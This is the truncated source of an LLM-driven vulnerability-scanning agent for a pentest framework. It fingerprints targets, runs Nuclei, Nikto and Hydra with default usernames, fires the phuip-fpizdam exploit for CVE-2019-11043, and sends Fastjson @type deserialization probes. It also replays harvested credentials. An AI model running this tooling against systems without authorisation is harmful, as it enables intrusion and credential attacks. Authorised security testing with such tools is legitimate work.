"""
vuln_agent.py
漏洞扫描 Agent —— LLM 驱动扫描策略

流程：
  1. whatweb/httpx + 主动 JSON 探测 做指纹识别
  2. LLM 分析指纹 → 动态生成 Nuclei 标签和扫描策略
  3. 按端口并发、端口内串行 Nuclei 扫描
  4. Nikto 补充 + Hydra 弱口令
  5. LLM 主动漏洞发现（工具扫不到时兜底）
"""
from __future__ import annotations

import asyncio
import json
import logging
import re
from typing import Any, Optional

from backend.agents.models import PortInfo, VulnFinding
from backend.knowledge.exploit_kb import ExploitKB, ExploitEntry
from backend.tools.executor import ToolExecutor, ExecuteResult, LogCallback, RecordCallback, DecisionCallback
from backend.tools.parsers.nuclei_parser import NucleiParser
from backend.tools.parsers.nikto_parser import NiktoParser
from backend.llm.router import LLMRouter

logger = logging.getLogger(__name__)

BRUTE_SERVICES = {
    21:    ("ftp",      ["anonymous", "admin", "ftp"]),
    22:    ("ssh",      ["root", "admin", "ubuntu"]),
    23:    ("telnet",   ["admin", "root"]),
    3306:  ("mysql",    ["root", "admin"]),
    5432:  ("postgres", ["postgres", "admin"]),
    6379:  ("redis",    [""]),
    27017: ("mongodb",  ["admin"]),
    445:   ("smb",      ["administrator", "admin", "guest"]),
    3389:  ("rdp",      ["administrator", "admin"]),
}


class VulnAgent:
    def __init__(self):
        self.executor = ToolExecutor()
        self.nuclei_parser = NucleiParser()
        self.nikto_parser = NiktoParser()
        self.llm = LLMRouter()
        self.kb = ExploitKB()
        self._decision_callback: DecisionCallback = None
        # 操作员实时指令(由 node_vuln_scan 从 PentestState 计算后传入), 注入到
        # 本 agent 的所有 LLM prompt 两端。空字符串等价于无指令(无副作用)。
        self._operator_block: str = ""

    async def run(
        self,
        target: str,
        ports: list[PortInfo],
        web_paths: list[str],
        path_contents: list[dict[str, Any]] | None = None,
        target_os: str = "unknown",
        target_port: Optional[int] = None,
        target_scheme: str = "",
        task_id: Optional[str] = None,
        log_callback: LogCallback = None,
        record_callback: RecordCallback = None,
        decision_callback: DecisionCallback = None,
        nmap_vuln_hints: list[dict] | None = None,
        workflow_mode: str = "pentest_engineer",
        seeds: Optional[dict[str, list]] = None,
        operator_block: str = "",
        operator_plan: Any = None,
    ) -> dict[str, Any]:
        """
        Args:
            seeds: feedback / supervisor 模式下的反馈输入。结构::

                {
                    "credentials": [{"user": "...", "value": "...", "source": "..."}, ...],
                    "web_paths":   ["/admin", ...],   # 由 orchestrator 直接合并到 web_paths
                    "ports":       [22, 3306, ...],   # 由 orchestrator 合并
                }

                凭据会驱动两件事：
                  ① 合成 ``credential-replay`` finding（tool=cred-replay），让
                     ExploitAgent 命中 ``credential_replay`` Skill 直接精准登录；
                  ② 把密码注入 hydra 的 ``-P`` 字典，弥补固定字典命中率不足。
        """
        self._decision_callback = decision_callback
        self._workflow_mode = workflow_mode
        self._operator_block = operator_block or ""
        # 结构化战术 plan; 用于:
        #   1) ``_active_vuln_discovery`` prompt 里把 plan.preferred_tools /
        #      plan.focus_targets 作为额外约束注入, 让 LLM 生成 verify_command
        #      时倾向用户偏好的工具(例如 sqlmap 而非 curl 注入)。
        #   2) 主动验证阶段在 _select_skills / scan strategy 里降权 avoided
        #      tools 对应的扫描类型。
        # 当前 P0 仅做存放与 prompt 注入, 工具级精挑由后续 PR 接入 _select_skills。
        self._operator_plan: Any = operator_plan
        self._seed_credentials: list[dict] = list((seeds or {}).get("credentials") or [])
        if self._seed_credentials:
            logger.info(
                f"[VulnAgent] 收到 {len(self._seed_credentials)} 条种子凭据 → "
                f"将驱动 hydra 字典 + 合成 credential-replay finding"
            )
        logger.info(f"[VulnAgent] 开始漏洞扫描: {target}")

        if log_callback or record_callback or decision_callback:
            origin_run = self.executor.run
            origin_run_script = self.executor.run_script

            async def _tool_stream_cb(ev: dict):
                if self._decision_callback:
                    await self._decision_callback({"action": "tool_stream", **ev})

            async def _run_with_log(*args, **kwargs):
                if log_callback:
                    kwargs.setdefault("log_callback", log_callback)
                if record_callback:
                    kwargs.setdefault("record_callback", record_callback)
                    kwargs.setdefault("record_phase", "vuln_scan")
                if self._decision_callback:
                    kwargs.setdefault("stream_callback", _tool_stream_cb)
                return await origin_run(*args, **kwargs)

            async def _run_script_with_log(*args, **kwargs):
                if log_callback:
                    kwargs.setdefault("log_callback", log_callback)
                if record_callback:
                    kwargs.setdefault("record_callback", record_callback)
                    kwargs.setdefault("record_phase", "vuln_scan")
                if self._decision_callback:
                    kwargs.setdefault("stream_callback", _tool_stream_cb)
                return await origin_run_script(*args, **kwargs)

            self.executor.run = _run_with_log
            self.executor.run_script = _run_script_with_log

        web_ports = [
            p for p in ports
            if p.service in ("http", "https", "http-proxy", "http-alt",
                              "opsmessaging", "jetty", "sun-answerbook")
            or p.port in (80, 443, 3000, 7001, 7002,
                          8000, 8008, 8080, 8081, 8090, 8161,
                          8443, 8888, 9000, 9001, 9090, 9200, 9443, 10000)
        ]

        # 如果用户显式指定了端口，确保它在 web_ports 中
        if target_port:
            existing_web_port_nums = {p.port for p in web_ports}
            if target_port not in existing_web_port_nums:
                for p in ports:
                    if p.port == target_port:
                        web_ports.insert(0, p)
                        break
                else:
                    # 端口不在 nmap 扫描结果中（可能扫描遗漏），手动补充
                    web_ports.insert(0, PortInfo(port=target_port, service="http"))

        # 用户指定的 scheme 作为全局默认（未指定时按端口号推断）
        _user_scheme = target_scheme.lower() if target_scheme else ""

        all_findings: list[VulnFinding] = []

        # ── Phase 0: 将 nmap --script=vuln 结果转为 VulnFinding ──
        if nmap_vuln_hints:
            for hint in nmap_vuln_hints:
                cves = hint.get("cves", [])
                cve_str = cves[0] if cves else ""
                hint_port = hint.get("port", 0)
                script_id = hint.get("script_id", "")
                vuln_state = hint.get("state", "info")
                is_confirmed = vuln_state == "VULNERABLE"
                name = cve_str or script_id.replace("-", " ").title()
                target_url = f"http://{target}:{hint_port}" if hint_port else target
                all_findings.append(VulnFinding(
                    name=f"Nmap: {name}",
                    severity="high" if is_confirmed else "medium",
                    cve=cve_str,
                    target=target_url,
                    port=hint_port,
                    description=f"nmap --script=vuln ({script_id}): {vuln_state}",
                    evidence=hint.get("output", "")[:2000],
                    exploitable=is_confirmed,
                    tool="nmap-vuln-script",
                ))
            logger.info(f"[VulnAgent] nmap vuln hints → {len(nmap_vuln_hints)} findings")

        # ── Phase 1: 指纹识别（各端口并发）───────────────
        fingerprints: dict[int, dict] = {}
        fp_tasks = []
        for wp in web_ports:
            if _user_scheme and wp.port == target_port:
                scheme = _user_scheme
            else:
                scheme = "https" if wp.port in (443, 8443) else "http"
            web_url = f"{scheme}://{target}:{wp.port}"
            fp_tasks.append(self._fingerprint(web_url, wp))

        fp_results = await asyncio.gather(*fp_tasks, return_exceptions=True)
        for wp, fp_result in zip(web_ports, fp_results):
            if isinstance(fp_result, Exception):
                logger.warning(f"[VulnAgent] 指纹识别异常 :{wp.port}: {fp_result}")
                fingerprints[wp.port] = {"url": f"http://{target}:{wp.port}", "summary": "unknown"}
            else:
                fingerprints[wp.port] = fp_result
                logger.info(f"[VulnAgent] 指纹 :{wp.port} -> {fp_result.get('summary', 'unknown')}")

        # ── Phase 2: LLM 分析指纹 → 扫描策略 ────────────
        scan_strategy = await self._llm_scan_strategy(
            target,
            target_os,
            ports,
            web_ports,
            fingerprints,
            web_paths,
            path_contents or [],
        )
        logger.info(f"[VulnAgent] LLM 扫描策略: {json.dumps(scan_strategy, ensure_ascii=False)[:300]}")

        if self._decision_callback:
            analysis = scan_strategy.get("analysis", "")
            tags = scan_strategy.get("nuclei_tags", [])
            hv_targets = scan_strategy.get("high_value_targets", [])
            await self._decision_callback({
                "action": "thought",
                "phase": "vuln_scan",
                "thinking": analysis or f"LLM 分析指纹后选择扫描标签: {', '.join(tags[:10])}",
                "reasoning": scan_strategy.get("reasoning", ""),
                "purpose": "漏洞扫描策略制定",
                "plan": [f"Nuclei 标签: {', '.join(tags[:8])}"] + [
                    f"高价值目标: {t}" for t in (hv_targets[:5] if isinstance(hv_targets, list) else [])
                ],
                "message": f"LLM 扫描策略: {len(tags)} 个标签, {len(hv_targets) if isinstance(hv_targets, list) else 0} 个高价值目标",
            })

        # ── Phase 3: 按端口并发，端口内串行扫描 ──────────
        async def _scan_one_port(wp: PortInfo) -> list[VulnFinding]:
            if _user_scheme and wp.port == target_port:
                scheme = _user_scheme
            else:
                scheme = "https" if wp.port in (443, 8443) else "http"
            web_url = f"{scheme}://{target}:{wp.port}"
            port_findings: list[VulnFinding] = []
            port_fp = fingerprints.get(wp.port, {})

            # 3a: LLM 推荐标签专扫（最精准，优先跑）
            llm_tags = scan_strategy.get("nuclei_tags", [])
            # 过滤掉会触发 LockOutRealm 的凭据测试标签
            # 凭据爆破留给 ExploitAgent 的 Skill 统一处理
            BLACKLISTED_TAGS = {"default-login", "default-credentials", "brute-force"}
            llm_tags = [t for t in llm_tags if t.lower() not in BLACKLISTED_TAGS]
            if llm_tags:
                r = await self._nuclei_tag_scan(web_url, target, llm_tags)
                port_findings.extend(r.get("findings", []))

            # 3b: 基础 CVE + 漏洞 + 配置错误扫描
            r = await self._nuclei_broad_scan(web_url, target)
            port_findings.extend(r.get("findings", []))

            # 3c: 对 Gobuster 发现的路径做深入扫描
            if web_paths:
                r = await self._nuclei_path_scan(web_url, target, web_paths)
                port_findings.extend(r.get("findings", []))

            # 3d: Nikto 补充
            r = await self._nikto_scan(web_url)
            port_findings.extend(r.get("findings", []))

            # 3e: 命中 PHP/PHP-FPM 信号时，主动触发 phuip 探针
            phuip_finding = await self._phuip_probe_if_php_signal(
                web_url=web_url,
                target=target,
                port=wp.port,
                fingerprint=port_fp,
            )
            if phuip_finding:
                port_findings.append(phuip_finding)

            return port_findings

        port_tasks = [_scan_one_port(wp) for wp in web_ports]
        port_tasks.append(self._brute_force_scan_wrapper(target, ports))

        scan_results = await asyncio.gather(*port_tasks, return_exceptions=True)
        for r in scan_results:
            if isinstance(r, Exception):
                logger.warning(f"[VulnAgent] 端口扫描异常: {r}")
            elif isinstance(r, list):
                all_findings.extend(r)

        # ── Phase 3.1: CVE 专项直检（无条件对所有 Web 端口）──
        # 某些 CVE 的检测不依赖指纹，直接发探测请求即可判断
        # CVE-2019-11043: 对所有 Web 端口发 %0a 路径注入请求
        cve_direct_findings = await self._cve_direct_checks(target, web_ports, fingerprints)
        all_findings.extend(cve_direct_findings)

        # ── Phase 3.5: 知识库驱动精准检测 ────────────────
        # 用指纹信息查知识库，用知识库里的具体检测命令验证漏洞
        kb_findings = await self._kb_driven_detection(
            target, target_os, ports, fingerprints, web_paths, all_findings
        )
        all_findings.extend(kb_findings)

        # ── Phase 4: LLM 主动漏洞发现（工具扫不到时兜底）──
        exploitable_count = sum(1 for f in all_findings if f.exploitable)
        has_high = any(f.severity in ("critical", "high") for f in all_findings)
        if exploitable_count == 0 or not has_high:
            logger.info("[VulnAgent] 工具发现不足，启动 LLM 主动漏洞分析...")
            llm_findings = await self._llm_active_discovery(
                target,
                target_os,
                ports,
                fingerprints,
                web_paths,
                path_contents or [],
                all_findings,
            )
            all_findings.extend(llm_findings)

            if self._decision_callback and llm_findings:
                finding_names = [f.name for f in llm_findings[:5]]
                await self._decision_callback({
                    "action": "thought",
                    "phase": "vuln_scan",
                    "thinking": (
                        f"工具扫描发现不足(exploitable={exploitable_count}, has_high={has_high})，"
                        f"LLM 主动分析后推测出 {len(llm_findings)} 个潜在漏洞: "
                        + ", ".join(finding_names)
                    ),
                    "purpose": "LLM 主动漏洞发现",
                    "plan": [f"发现: {n}" for n in finding_names],
                    "message": f"LLM 主动发现 {len(llm_findings)} 个潜在漏洞",
                })

        # ── Phase 4.5: 为非 Web 服务端口生成 service-level findings ──
        # 确保 SSH/FTP/SMB/RDP 等端口有对应 finding，让 ExploitAgent 的 Skill 能匹配
        svc_findings = self._generate_service_findings(target, ports, all_findings)
        all_findings.extend(svc_findings)

        # ── Phase 4.6: 凭据复用 finding 合成 ───────────────
        # feedback / supervisor 模式下，前序漏洞产生的真实凭据会通过 seeds 注入；
        # 这里为每个匹配端口产出"凭据复用机会"finding，触发 credential_replay Skill。
        cred_replay_findings = self._synthesize_credential_replay_findings(target, ports)
        if cred_replay_findings:
            all_findings.extend(cred_replay_findings)
            if self._decision_callback:
                names = ", ".join(f.name for f in cred_replay_findings[:5])
                await self._decision_callback({
                    "action": "thought",
                    "phase": "vuln_scan",
                    "thinking": (
                        f"凭据复用合成: 已抓 {len(getattr(self, '_seed_credentials', []) or [])} 条凭据，"
                        f"为 {len(cred_replay_findings)} 个服务端口合成 cred-replay finding ({names})"
                    ),
                    "purpose": "凭据复用 finding 合成",
                    "message": f"凭据复用 +{len(cred_replay_findings)} findings",
                    "tone": "info",
                })

        all_findings = _deduplicate(all_findings)

        # ── Phase 5: Finding 事后校验与修正 ───────────────
        # 根据指纹信息修正误判的 finding（如 Struts2 应用被识别为 Tomcat 弱口令）
        all_findings = self._enrich_findings(all_findings, fingerprints)

        # ── Phase 6: 统一 FindingVerifier 复核 ───────────
        from backend.agents.finding_verifier import FindingVerifier
        verifier = FindingVerifier()
        all_findings = [
            verifier.verify(f, fingerprint=fingerprints.get(f.port, {}), raw_output=f.evidence)
            for f in all_findings
        ]

        # ── Phase 7: 纯探测类结果过滤 ────────────────────
        # 将 nuclei/nikto 的纯服务识别、组件版本探测等结果
        # 从漏洞列表移除，降级为侦察附属信息
        from backend.agents.detection_filter import filter_findings
        all_findings, detection_results = filter_findings(all_findings)
        if detection_results:
            logger.info(
                f"[VulnAgent] 过滤纯探测类结果: {len(detection_results)} 个 → "
                + ", ".join(f.name[:60] for f in detection_results[:5])
                + (f" ... +{len(detection_results) - 5}" if len(detection_results) > 5 else "")
            )

        confirmed_count = sum(1 for f in all_findings if f.verification_status == "confirmed")
        rejected_count = sum(1 for f in all_findings if f.verification_status == "rejected")
        logger.info(
            f"[VulnAgent] 扫描完成，共 {len(all_findings)} 个发现 "
            f"(confirmed={confirmed_count}, rejected={rejected_count}, "
            f"filtered_detection={len(detection_results)})"
        )

        return {
            "findings": all_findings,
            "raw_nuclei": "",
            "raw_nikto": "",
            "fingerprints": fingerprints,
            "detection_results": [f.model_dump() for f in detection_results],
        }

    _PHUIP_STRONG_SIGNALS = ("attack params found", "was able to execute", "php_value")
    _PHUIP_WEAK_SIGNALS = (
        "success", "status code 500", "status code 502",
        "possible qsl", "qsl",
    )

    async def _phuip_probe_if_php_signal(
        self,
        web_url: str,
        target: str,
        port: int,
        fingerprint: dict,
    ) -> VulnFinding | None:
        """
        PHP 信号门控 → 短超时多轮 phuip 探针。

        返回:
          - VulnFinding(exploitable=True)  仅当强阳性
          - None                           所有其他情况（reason 写入日志）
        """
        signal_text = " ".join([
            str(fingerprint.get("summary") or ""),
            str(fingerprint.get("whatweb") or ""),
            str(fingerprint.get("httpx") or ""),
            str(fingerprint.get("nmap_service") or ""),
            str(fingerprint.get("nmap_version") or ""),
            str(fingerprint.get("nmap_banner") or ""),
        ]).lower()
        if not any(sig in signal_text for sig in ("php", "php-fpm", "fastcgi", "fpm")):
            return None

        logger.info(f"[VulnAgent] PHP 信号命中，触发 phuip 探针 :{port}")

        max_attempts = 3
        per_attempt_timeout = 60
        best_output = ""
        best_exit = -1
        reason = "no_attempt"

        for attempt in range(1, max_attempts + 1):
            probe_script = f"""
if command -v phuip-fpizdam >/dev/null 2>&1; then
  PHUIP="phuip-fpizdam"
elif [ -x /opt/phuip-fpizdam ]; then
  PHUIP="/opt/phuip-fpizdam"
else
  echo "__PHUIP_MISSING__"
  exit 0
fi
$PHUIP "{web_url}/index.php" 2>&1
"""
            result: ExecuteResult = await self.executor.run_script(
                script_content=probe_script,
                timeout=per_attempt_timeout,
                record_purpose=f"phuip_probe_attempt_{attempt}",
            )
            output = f"{result.stdout or ''}\n{result.stderr or ''}".strip()
            out_lower = output.lower()

            logger.info(
                f"[VulnAgent] phuip 探针 #{attempt} :{port} "
                f"exit={result.exit_code} len={len(output)}"
            )

            if "__phuip_missing__" in out_lower:
                reason = "phuip_missing"
                logger.info("[VulnAgent] phuip-fpizdam 不可用，跳过")
                break

            timed_out = result.exit_code is None or (
                result.exit_code != 0 and len(output) == 0
            )

            strong = [s for s in self._PHUIP_STRONG_SIGNALS if s in out_lower]
            weak = [s for s in self._PHUIP_WEAK_SIGNALS if s in out_lower]

            if strong:
                best_output = output
                best_exit = result.exit_code or 0
                reason = "phuip_positive"
                logger.info(
                    f"[VulnAgent] ✅ phuip 强阳性 :{port} "
                    f"signals={strong}"
                )
                break

            if weak:
                best_output = output
                best_exit = result.exit_code or 0
                reason = "phuip_weak_signal"
                logger.info(
                    f"[VulnAgent] phuip 弱信号 :{port} "
                    f"signals={weak}, 继续重试"
                )

            if timed_out:
                reason = "phuip_timeout"
                logger.info(
                    f"[VulnAgent] phuip 探针 #{attempt} 超时 :{port}"
                )
                if not best_output:
                    best_output = output
                    best_exit = result.exit_code or -1
                continue

            if not strong and not weak:
                if not best_output:
                    best_output = output
                    best_exit = result.exit_code or 0
                reason = "phuip_no_signal"

        logger.info(
            f"[VulnAgent] phuip 探针结论 :{port} reason={reason} "
            f"exit={best_exit} output_len={len(best_output)}"
        )

        if reason != "phuip_positive":
            return None

        evidence_lines = [
            f"Command\nphuip-fpizdam {web_url}/index.php",
            f"Stdout\n{best_output.strip() or '(empty)'}",
        ]
        return VulnFinding(
            name="PHP-FPM CVE-2019-11043",
            severity="high",
            cve="CVE-2019-11043",
            target=web_url,
            port=port,
            description=(
                "命中 PHP/PHP-FPM 信号后自动执行 phuip-fpizdam 探针，"
                "已确认可利用参数。"
            ),
            evidence="\n\n".join(evidence_lines),
            exploitable=True,
            tool="phuip-probe",
        )

    # ================================================================
    # Phase 4.5: 为非 Web 服务端口生成 service-level findings
    # ================================================================

    _SERVICE_FINDING_MAP: dict[str, dict] = {
        "ssh":    {"name": "SSH Service",  "severity": "medium", "desc": "SSH 服务开放，可尝试弱口令/版本漏洞利用"},
        "ftp":    {"name": "FTP Service",  "severity": "medium", "desc": "FTP 服务开放，可尝试匿名登录/弱口令/版本漏洞"},
        "smb":    {"name": "SMB Service",  "severity": "medium", "desc": "SMB 服务开放，可尝试枚举共享/弱口令/MS17-010等"},
        "microsoft-ds": {"name": "SMB Service", "severity": "medium", "desc": "SMB 服务开放"},
        "netbios-ssn":  {"name": "SMB Service", "severity": "medium", "desc": "NetBIOS/SMB 服务开放"},
        "telnet": {"name": "Telnet Service", "severity": "high", "desc": "Telnet 明文协议开放，可尝试弱口令"},
        "rdp":    {"name": "RDP Service",  "severity": "medium", "desc": "RDP 远程桌面开放，可尝试弱口令/BlueKeep"},
        "ms-wbt-server": {"name": "RDP Service", "severity": "medium", "desc": "RDP 远程桌面开放"},
        "mysql":  {"name": "MySQL Service", "severity": "medium", "desc": "MySQL 数据库暴露，可尝试弱口令/UDF提权"},
        "postgresql": {"name": "PostgreSQL Service", "severity": "medium", "desc": "PostgreSQL 数据库暴露"},
        "redis":  {"name": "Redis Service", "severity": "high", "desc": "Redis 服务暴露，可尝试未授权访问/写文件"},
        "mongodb": {"name": "MongoDB Service", "severity": "high", "desc": "MongoDB 暴露，可尝试未授权访问"},
        "snmp":   {"name": "SNMP Service", "severity": "medium", "desc": "SNMP 服务开放，可尝试社区字符串枚举"},
        "vnc":    {"name": "VNC Service",  "severity": "medium", "desc": "VNC 远程桌面开放，可尝试弱口令"},
    }

    _PORT_SERVICE_OVERRIDE: dict[int, str] = {
        21: "ftp", 22: "ssh", 23: "telnet", 445: "smb", 139: "netbios-ssn",
        3306: "mysql", 5432: "postgresql", 6379: "redis", 27017: "mongodb",
        3389: "rdp", 161: "snmp", 5900: "vnc",
    }

    def _generate_service_findings(
        self,
        target: str,
        ports: list[PortInfo],
        existing_findings: list[VulnFinding],
    ) -> list[VulnFinding]:
        """Create lightweight VulnFinding entries for non-web service ports
        so ExploitAgent skill matching can pick them up."""
        existing_ports = {f.port for f in existing_findings if f.port}
        findings: list[VulnFinding] = []
        seen_services: set[str] = set()

        for p in ports:
            svc = p.service.lower() if p.service else ""
            if not svc:
                svc = self._PORT_SERVICE_OVERRIDE.get(p.port, "")
            if not svc or svc in seen_services:
                continue
            meta = self._SERVICE_FINDING_MAP.get(svc)
            if not meta:
                continue
            if p.port in existing_ports:
                continue
            seen_services.add(svc)
            findings.append(VulnFinding(
                name=meta["name"],
                severity="info",
                cve="",
                target=f"{target}:{p.port}",
                port=p.port,
                description=f"{meta['desc']} (版本: {p.version or 'unknown'})",
                evidence=f"nmap: {p.port}/{p.service} {p.version} {p.banner}".strip(),
                exploitable=False,
                confidence=40,
                verification_status="suspected",
                tool="service-enum",
            ))
        if findings:
            logger.info(f"[VulnAgent] 生成 {len(findings)} 个 service-level findings: "
                        + ", ".join(f.name for f in findings))
        return findings

    # ================================================================
    # Phase 1: 指纹识别
    # ================================================================

    async def _fingerprint(self, web_url: str, port_info: PortInfo) -> dict:
        """用 whatweb + httpx + 主动 JSON 探测做指纹识别"""
        fp = {
            "url": web_url,
            "port": port_info.port,
            "nmap_service": port_info.service,
            "nmap_version": port_info.version,
            "nmap_banner": port_info.banner,
            "whatweb": "",
            "httpx": "",
            "json_probe": "",
            "summary": "",
        }

        # whatweb
        whatweb_result: ExecuteResult = await self.executor.run(
            tool="whatweb",
            args=["--color=never", "-a", "3", web_url],
            timeout=30,
        )
        if whatweb_result.success and whatweb_result.stdout:
            fp["whatweb"] = whatweb_result.stdout.strip()

        # httpx
        httpx_result: ExecuteResult = await self.executor.run(
            tool="httpx",
            args=[
                "-u", web_url,
                "-title", "-tech-detect", "-status-code",
                "-server", "-content-type",
                "-follow-redirects",
                "-silent",
            ],
            timeout=20,
        )
        if httpx_result.success and httpx_result.stdout:
            fp["httpx"] = httpx_result.stdout.strip()

        # ── 获取首页 HTML 内容用于框架识别 ─────────────────
        # whatweb/httpx 只看 header，很多框架特征在 HTML body 中
        # 比如 Struts2 Showcase 页面包含 "struts", ".action", "opensymphony"
        html_body_result: ExecuteResult = await self.executor.run(
            tool="curl",
            args=["-s", "-L", "--max-time", "8", web_url],
            timeout=12,
        )
        html_body = ""
        if html_body_result.success and html_body_result.stdout:
            html_body = html_body_result.stdout
            fp["html_body_preview"] = html_body[:1000]

        # 基础关键词匹配（增加 HTML body）
        combined = f"{fp['whatweb']} {fp['httpx']} {port_info.version} {port_info.banner} {html_body}".lower()
        techs = []
        tech_keywords = {
            "thinkphp": "ThinkPHP", "laravel": "Laravel", "django": "Django",
            "flask": "Flask", "spring": "Spring", "struts": "Struts",
            "tomcat": "Tomcat", "nginx": "Nginx", "apache": "Apache",
            "iis": "IIS", "weblogic": "WebLogic", "jboss": "JBoss",
            "wordpress": "WordPress", "drupal": "Drupal", "joomla": "Joomla",
            "shiro": "Shiro", "fastjson": "Fastjson", "jackson": "Jackson",
            "vue": "Vue.js", "react": "React", "angular": "Angular",
            "php": "PHP", "java": "Java", "python": "Python", "node": "Node.js",
            "redis": "Redis", "mysql": "MySQL", "postgres": "PostgreSQL",
            "mongodb": "MongoDB", "elasticsearch": "Elasticsearch",
            "activemq": "ActiveMQ", "rabbitmq": "RabbitMQ",
            "geoserver": "GeoServer", "gitlab": "GitLab", "jenkins": "Jenkins",
            "grafana": "Grafana", "nacos": "Nacos", "xxl-job": "XXL-JOB",
            "solr": "Solr", "confluence": "Confluence", "exchange": "Exchange",
        }
        for kw, name in tech_keywords.items():
            if kw in combined:
                techs.append(name)

        # ── HTML body 深度框架检测（补充简单关键词匹配的盲区）──
        # 有些框架不在 header 里暴露，只能从 HTML body 的特征判断
        if html_body:
            html_lower = html_body.lower()

            # Struts2: 需要 opensymphony/xwork 强特征 + 至少 3 分
            import re
            if not any(t == "Struts" for t in techs):
                struts_indicators = 0
                has_strong_struts = ("opensymphony" in html_lower or "xwork" in html_lower)
                if ".action" in html_lower and ("href" in html_lower or "action=" in html_lower):
                    struts_indicators += 1
                if has_strong_struts:
                    struts_indicators += 2
                if "showcase" in html_lower and ".action" in html_lower:
                    struts_indicators += 2
                if re.search(r'\.action["\s?;]', html_lower):
                    struts_indicators += 1
                if struts_indicators >= 3 and has_strong_struts:
                    techs.append("Struts")
                    if "Java" not in techs:
                        techs.append("Java")
                    logger.info(f"[VulnAgent] HTML body 检测到 Struts2 (score={struts_indicators})")

            # Shiro: 页面内容中的 rememberMe 相关
            if not any(t == "Shiro" for t in techs):
                if "rememberme" in html_lower or "shiro" in html_lower:
                    techs.append("Shiro")

            # GeoServer: OWS/WFS/WMS 接口
            if not any(t == "GeoServer" for t in techs):
                if "geoserver" in html_lower or ("/ows?" in html_lower) or ("/wfs?" in html_lower):
                    techs.append("GeoServer")

            # ActiveMQ: admin console
            if not any(t == "ActiveMQ" for t in techs):
                if "activemq" in html_lower or "amq-" in html_lower:
                    techs.append("ActiveMQ")

        # ── 技术栈层级区分 ────────────────────────────────
        # 应用框架（决定漏洞类型的核心技术）
        APP_FRAMEWORKS = {"Struts", "ThinkPHP", "Flask", "Django", "Spring",
                          "Laravel", "WordPress", "Drupal", "Joomla",
                          "GeoServer", "GitLab", "Jenkins", "Nacos",
                          "Confluence", "Grafana", "XXL-JOB", "Solr"}
        # 中间件/容器（漏洞归属独立于上层应用）
        MIDDLEWARE = {"Tomcat", "WebLogic", "JBoss", "ActiveMQ", "RabbitMQ"}
        # 运行时/服务器（最底层，只有在没有更具体技术时才有意义）
        SERVERS = {"Nginx", "Apache", "IIS"}
        # 安全组件（可能叠加在任何框架上）
        SECURITY_COMPONENTS = {"Shiro", "Fastjson", "Jackson"}

        app_frameworks_found = [t for t in techs if t in APP_FRAMEWORKS]
        middleware_found = [t for t in techs if t in MIDDLEWARE]
        security_found = [t for t in techs if t in SECURITY_COMPONENTS]
        servers_found = [t for t in techs if t in SERVERS]

        # primary_tech: 决定这个端口"是什么应用"
        # 优先级: 应用框架 > 安全组件 > 中间件 > 服务器
        if app_frameworks_found:
            fp["primary_tech"] = app_frameworks_found[0]
        elif security_found:
            fp["primary_tech"] = security_found[0]
        elif middleware_found:
            fp["primary_tech"] = middleware_found[0]
        elif servers_found:
            fp["primary_tech"] = servers_found[0]
        else:
            fp["primary_tech"] = ""

        fp["app_frameworks"] = app_frameworks_found
        fp["middleware"] = middleware_found
        fp["security_components"] = security_found
        fp["server_tech"] = servers_found

        # ── 主动 JSON 探测（检测 fastjson/jackson/spring 等）──
        # 探测1: 发畸形 @type 看响应状态码
        json_probe_status: ExecuteResult = await self.executor.run(
            tool="curl",
            args=[
                "-s", "-X", "POST",
                "-H", "Content-Type: application/json",
                "-d", '{"@type":"java.lang.AutoCloseable"',
                "-o", "/dev/null", "-w", "%{http_code}",
                "--max-time", "5",
                web_url,
            ],
            timeout=10,
        )

        # 探测2: 发 @type payload 看报错内容
        json_probe_body: ExecuteResult = await self.executor.run(
            tool="curl",
            args=[
                "-s", "-X", "POST",
                "-H", "Content-Type: application/json",
                "-d", '{"a":{"@type":"java.net.Inet4Address","val":"127.0.0.1"}}',
                "--max-time", "5",
                web_url,
            ],
            timeout=10,
        )

        # 探测3: 发正常 JSON 看是否接受
        json_probe_normal: ExecuteResult = await self.executor.run(
            tool="curl",
            args=[
                "-s", "-X", "POST",
                "-H", "Content-Type: application/json",
                "-d", '{"test": 1}',
                "--max-time", "5",
                "-w", "\n%{http_code}",
                web_url,
            ],
            timeout=10,
        )

        probe_output = f"{json_probe_body.stdout} {json_probe_body.stderr}".lower()
        normal_output = json_probe_normal.stdout.lower()

        if "fastjson" in probe_output or "com.alibaba.fastjson" in probe_output:
            if "Fastjson" not in techs:
                techs.append("Fastjson")
            if "Java" not in techs:
                techs.append("Java")
            fp["json_probe"] = f"FASTJSON_DETECTED: {json_probe_body.stdout}"
        elif "jackson" in probe_output or "com.fasterxml.jackson" in probe_output:
            if "Jackson" not in techs:
                techs.append("Jackson")
            if "Java" not in techs:
                techs.append("Java")
            fp["json_probe"] = f"JACKSON_DETECTED: {json_probe_body.stdout}"
        elif "springframework" in probe_output or "spring" in probe_output:
            if "Spring" not in techs:
                techs.append("Spring")
            if "Java" not in techs:
                techs.append("Java")
            fp["json_probe"] = f"SPRING_DETECTED: {json_probe_body.stdout}"
        elif json_probe_status.success and json_probe_status.stdout.strip() in ("400", "500", "415"):
            # 后端解析了 JSON 请求，可能是 Java 框架
            fp["json_probe"] = f"JSON_ENDPOINT: status={json_probe_status.stdout.strip()}, body={json_probe_body.stdout}"
            if "application/json" in normal_output and "Java" not in techs:
                techs.append("Java")

        fp["summary"] = ", ".join(techs) if techs else "unknown"
        return fp

    # ================================================================
    # Phase 2: LLM 驱动扫描策略
    # ================================================================

    async def _llm_scan_strategy(
        self,
        target: str,
        target_os: str,
        ports: list[PortInfo],
        web_ports: list[PortInfo],
        fingerprints: dict[int, dict],
        web_paths: list[str],
        path_contents: list[dict[str, Any]],
    ) -> dict:
        from backend.llm.prompts.templates import VULN_SCAN_STRATEGY

        fp_summary = {}
        for port, fp in fingerprints.items():
            fp_summary[port] = {
                "url": fp.get("url", ""),
                "whatweb": fp.get("whatweb", "")[:500],
                "httpx": fp.get("httpx", "")[:300],
                "json_probe": fp.get("json_probe", ""),
                "detected_tech": fp.get("summary", ""),
                "nmap_version": fp.get("nmap_version", ""),
            }

        ports_info = [{"port": p.port, "service": p.service, "version": p.version[:60]} for p in ports[:20]]
        path_content_summary = []
        for item in (path_contents or [])[:12]:
            path_content_summary.append({
                "path": item.get("path", ""),
                "status": item.get("status", 0),
                "title": str(item.get("title", ""))[:80],
                "tech_clues": item.get("tech_clues", []),
                "keywords": item.get("keywords", []),
                "content_snippet": str(item.get("content_snippet", ""))[:220],
            })

        prompt = VULN_SCAN_STRATEGY.format(
            target=target,
            target_os=target_os,
